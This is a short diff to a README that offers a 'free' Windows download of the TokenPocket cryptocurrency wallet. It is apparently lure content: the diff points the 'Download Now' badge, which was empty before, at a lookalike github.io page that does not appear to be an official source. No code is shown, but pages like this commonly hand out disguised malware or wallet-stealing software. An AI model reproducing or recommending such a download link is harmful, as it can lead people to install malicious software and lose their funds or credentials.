@@ -1,6 +1,6 @@
 # TokenPocket Wallet — Download Free for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tokenpocket-download.github.io/.github/)
 
 ## ⚙️ How to Use
 
